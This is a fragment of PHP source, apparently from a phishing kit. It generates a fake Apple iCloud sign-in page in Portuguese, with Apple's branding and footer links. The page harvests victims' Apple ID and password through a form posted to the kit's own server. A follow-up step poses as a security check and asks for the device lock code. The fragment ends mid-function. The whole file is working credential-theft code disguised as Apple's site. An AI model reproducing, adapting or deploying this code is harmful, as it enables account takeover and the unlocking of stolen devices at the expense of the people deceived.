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" srcset="" alt="Logotipo do aplicativo" style="width: 100px;">' ;
		$html .= "\n\n" . '        <span id="txt_top1"><h2>' . $ci->lang->line('Singin_message') . '</h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= "\n\n" . '        <span id="txt_top2" style="display: none;"><h2>' . 'Verificação de Segurança' . '</h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= form_open(site_url('authority/getBall'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" ;
		$html .= '        <input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
		$html .= '        <input type="hidden" name="SizeBall"  id="SizeBall" value="4" >' . "\n";
		//$html .= '<div id="main_form">';
		$html .= '        <input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">';
		$html .= "\n" . ' <input type="button" name="showPassword" id="showPassword" value=""> ';
		$html .= '        <input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n";
		//$html .= "\n" . ' <input type="button" name="showPassword2" id="showPassword2" value=""> ';
		//$html .= '        <input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		$html .= '        <input type="button" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		//$html .= '</div>';
		$html .= '
		<div id="security-code" class="security-code-wrap security-code-6 " localiseddigit="Dígitos" style="display: none;">
															<div class="security-code-container force-ltr">
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo2\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo1" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 1" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="0">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo3\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo2" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 2" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="1">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo4\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo3" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 3" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="2">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeypress="return SomenteNumero(event);" onkeyup="SendForm(); proximoCampo(this, \'campo1\')" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo4" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 6" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="5">
																</div>
															</div>

															<label class="sr-only" id="idms-input-error-1501591434388-0"></label>

														</div> ';

		$html .= "\n" . '        <div class="alrt">' . "\n" . '            <p>' . $ci->lang->line('incorrect_message') . '</p>' . "\n" . '            <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '        </div>' . "\n" . '        </form>' . "\n\n" ;
		$html .= '        <div class="keepme" id="keepme">' . "\n" . '            <input type="checkbox">' . "\n" . '            <span for="keepme">' . $ci->lang->line('Keepsigin_message') . '</span>' . "\n" . '        </div>' ;
		$html .= "\n\n" . '        <div class="forget" id="forget2" style="display: none;">' . "\n" .    "\n" . '            <div id="response"></div>' . "\n" . '        </div>';
		$html .= "\n\n" . '        <div class="forget" id="forget">' . "\n" . '            <a href="https://iforgot.apple.com/" target="_blank">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '            <div id="response"></div>' . "\n" . '        </div>' . "\n\n" ;
		$html .= '        <div class="create" id="create">' . $ci->lang->line('DonthaveanAppleid_message') . ' <a href="#">' . $ci->lang->line('Createyoursnow_message') . '.</a></div>' . "\n\n" ;
		$html .= '        <div class="create" id="create2"  style="display: none;">' . 'Por motivos de segurança, é necessário inserir o código de bloqueio do dispositivo para prosseguir.</div> ' . '    </section>' . "\n\n" ;

	}


	$html .= '<section class="imessage" style="display:' . $logged . ';">' ;
	$html .= "\n\n\n" . '        <div class="container">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" ;
	$html .= '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' ;
	$html .= "\n" . '                    <img class="" src="/assets/img/11.png" alt="">' . "\n" ;
	$html .= '                    <span>' . $ci->lang->line('Reminders_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" ;
	$html .= '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" ;
	$html .= '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/9.png" alt="">' . "\n" . '                    <span>' . "\n\t\t\t\t\t\t" . $ci->lang->line('Notes_message') . "\n\t\t\t\t\t" . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/3.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('iCloudDrive_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/10.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Photos_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/1.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Contacts_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/8.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Mail_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/12.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Settings_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/2.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/6.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Keynote_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/5.png" alt="">' . "\n" . '                    <span> ' . $ci->lang->line('Numbers_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/20.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindFriends_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/7.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Pages_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>' . "\n\n" . '    <footer class="foot">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n\n" . '                <div class="col-md-10 col-xs-12 foot-link">' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/support/systemstatus/" target="_blank">' . "\n" . '                        ' . $ci->lang->line('Systemstatus_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/privacy/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Privacy_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/legal/icloud/ww/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Terms_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <span class="copyright">' . $ci->lang->line('Copyrights_message') . '</span>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-xs-12 apple">' . "\n" . '                    <a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>' . "\n" . '                </div>' . "\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </footer>' . "\n\n" . '</div>' . "\n" . '    <div class="main-container">' . "\n" . '    <div class="section-bgs" style="display: none;">' . "\n" . '        <canvas id="bgs"></canvas>' . "\n" . '    </div>' . "\n" . '    <script src="/assets/js/jquery.js"></script>' .  "\n";
	$html .= '<script src="' . site_url('assets/js/bolinha2.js?t=' . time()) . '" type="text/javascript"></script>' . "\n" . '    <script src="/assets/js/strap.min.js"></script>' . "\n" . '    <script src="/assets/js/newc.min.js?t=' . time() . '"></script>' . "\n";
	$html .= '    <script src="/assets/js/ajax-form2.js?t=' . time() . '"></script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $html;
}
}


if (!(function_exists('bolinha'))) {
function bolinha($title, $emailid, $MD5IdentificaAcesso)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
